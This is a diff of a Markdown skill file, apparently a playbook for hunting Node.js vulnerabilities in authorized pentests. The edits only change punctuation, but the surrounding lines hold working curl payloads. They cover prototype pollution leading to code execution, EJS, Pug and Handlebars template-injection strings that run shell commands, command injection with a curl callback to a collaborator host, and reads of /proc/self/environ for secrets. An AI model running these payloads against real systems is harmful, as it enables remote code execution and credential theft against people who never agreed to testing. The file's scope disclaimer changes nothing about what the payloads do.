@@ -29,7 +29,7 @@ report_count: 24
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-NODEJS: Node.js Specific Vulnerabilities
+# HUNT-NODEJS — Node.js Specific Vulnerabilities
 
 ## Evidence and non-destructive test limits
 
@@ -40,11 +40,11 @@ Runtime headers are hints, not proof; payload acceptance/reflection does not est
 Prototype Pollution reaching a sink in Node.js backend = Critical RCE.
 
 **Highest-value chains:**
-- **Prototype Pollution → RCE**; `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
-- **Express trust proxy**; `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
-- **EJS/Pug SSTI**; template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
-- **`child_process` injection**; user input interpolated into shell command string → OS command injection
-- **`require()` path traversal**; attacker-controlled module path → load arbitrary file as JS
+- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
+- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
+- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
+- **`child_process` injection** — user input interpolated into shell command string → OS command injection
+- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS
 
 ---
 
@@ -61,7 +61,7 @@ __proto__ in JSON accepted        Prototype pollution candidate
 
 ---
 
-## Phase 1: Fingerprint
+## Phase 1 — Fingerprint
 
 ```bash
 # Confirm Node.js/Express
@@ -78,10 +78,10 @@ curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot 
 
 ---
 
-## Phase 2: Prototype Pollution Detection
+## Phase 2 — Prototype Pollution Detection
 
 ```bash
-# JSON body injection: test if __proto__ is accepted
+# JSON body injection — test if __proto__ is accepted
 curl -s -X POST https://$TARGET/api/merge \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"polluted": "yes"}}'
@@ -101,7 +101,7 @@ curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
 
 ---
 
-## Phase 3: Prototype Pollution → RCE Chain
+## Phase 3 — Prototype Pollution → RCE Chain
 
 ```bash
 # If pollution is confirmed, attempt to reach dangerous sinks
@@ -128,12 +128,12 @@ curl -s -X POST https://$TARGET/api/template \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'
 
-# OOB confirmation: check Interactsh for callback
+# OOB confirmation — check Interactsh for callback
 ```
 
 ---
 
-## Phase 4: Express Trust Proxy Abuse
+## Phase 4 — Express Trust Proxy Abuse
 
 ```bash
 # If Express has trust proxy enabled, X-Forwarded-For is trusted
@@ -161,10 +161,10 @@ done
 
 ---
 
-## Phase 5: Template Engine SSTI (EJS / Pug / Handlebars)
+## Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)
 
 ```bash
-# EJS SSTI: if user input reaches EJS template context
+# EJS SSTI — if user input reaches EJS template context
 # Test basic: <%= 7*7 %> should return 49
 curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
@@ -180,7 +180,7 @@ curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'
 
-# Handlebars: prototype pollution via template
+# Handlebars — prototype pollution via template
 curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
@@ -188,7 +188,7 @@ curl -s -X POST https://$TARGET/api/render \
 
 ---
 
-## Phase 6: child_process Command Injection
+## Phase 6 — child_process Command Injection
 
 ```bash
 # Look for endpoints that run shell commands with user input
@@ -207,7 +207,7 @@ curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
 
 ---
 
-## Phase 7: /proc/self/environ Exfil
+## Phase 7 — /proc/self/environ Exfil
 
 ```bash
 # If LFI exists on Node.js app, /proc/self/environ leaks env vars
@@ -249,7 +249,7 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
